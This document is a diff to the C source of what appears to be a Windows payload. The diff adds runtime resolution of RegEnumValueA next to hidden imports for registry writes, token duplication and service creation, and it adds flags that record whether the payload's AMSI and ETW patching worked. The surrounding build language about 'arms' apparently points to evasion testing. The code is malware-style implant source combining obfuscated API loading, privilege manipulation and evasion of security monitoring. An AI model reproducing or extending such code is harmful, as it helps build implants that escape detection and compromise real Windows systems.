@@ -245,6 +245,7 @@ typedef LONG (WINAPI *fn_reg_query_info_key)(HKEY, LPSTR, LPDWORD, LPDWORD,
                                              LPDWORD, LPDWORD, LPDWORD,
                                              LPDWORD, LPDWORD, LPDWORD,
                                              LPDWORD, PULONG);
+typedef LSTATUS (WINAPI *fn_reg_enum_value)(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD);
 typedef LRESULT (WINAPI *fn_reg_close_key)(HKEY);
 typedef BOOL (WINAPI *fn_open_process_token)(HANDLE, DWORD, PHANDLE);
 typedef BOOL (WINAPI *fn_duplicate_token_ex)(HANDLE, DWORD, HANDLE,
@@ -267,6 +268,7 @@ static fn_reg_open_key_ex px_reg_open_key_ex = NULL;
 static fn_reg_set_value_ex px_reg_set_value_ex = NULL;
 static fn_reg_query_value_ex px_reg_query_value_ex = NULL;
 static fn_reg_query_info_key px_reg_query_info_key = NULL;
+static fn_reg_enum_value px_reg_enum_value = NULL;
 static fn_reg_close_key px_reg_close_key = NULL;
 static fn_open_process_token px_open_process_token = NULL;
 static fn_duplicate_token_ex px_duplicate_token_ex = NULL;
@@ -275,6 +277,18 @@ static fn_lookup_privilege_name px_lookup_privilege_name = NULL;
 static fn_open_sc_manager px_open_sc_manager = NULL;
 static fn_create_service px_create_service = NULL;
 static fn_close_service_handle px_close_service_handle = NULL;
+
+/* Whether this payload's own evasion took.
+ *
+ * The capability library reports it, so a run can say whether its own
+ * evasion worked rather than assuming it.
+ *
+ * These live HERE rather than in the variant modules because those
+ * modules only exist when their flag is on, and the capability library
+ * is compiled into every arm.
+ */
+int px_amsi_patched = 0;
+int px_etw_patched = 0;
 
 /* The advapi32 module name, from the encoded string table.
  *
@@ -304,6 +318,7 @@ static int px_advapi_init(void)
     px_reg_set_value_ex = (fn_reg_set_value_ex)px_proc(h, "RegSetValueExA");
     px_reg_query_value_ex = (fn_reg_query_value_ex)px_proc(h, "RegQueryValueExA");
     px_reg_query_info_key = (fn_reg_query_info_key)px_proc(h, "RegQueryInfoKeyA");
+    px_reg_enum_value = (fn_reg_enum_value)px_proc(h, "RegEnumValueA");
     px_reg_close_key = (fn_reg_close_key)px_proc(h, "RegCloseKey");
     px_open_process_token = (fn_open_process_token)px_proc(h, "OpenProcessToken");
     px_duplicate_token_ex = (fn_duplicate_token_ex)px_proc(h, "DuplicateTokenEx");
@@ -316,7 +331,7 @@ static int px_advapi_init(void)
     ok = px_reg_create_key_ex && px_reg_open_key_ex && px_reg_set_value_ex &&
          px_reg_query_value_ex && px_reg_query_info_key && px_reg_close_key &&
          px_open_process_token && px_duplicate_token_ex &&
-         px_get_token_information && px_lookup_privilege_name &&
+         px_reg_enum_value && px_get_token_information && px_lookup_privilege_name &&
          px_open_sc_manager && px_create_service && px_close_service_handle;
     return ok;
 }
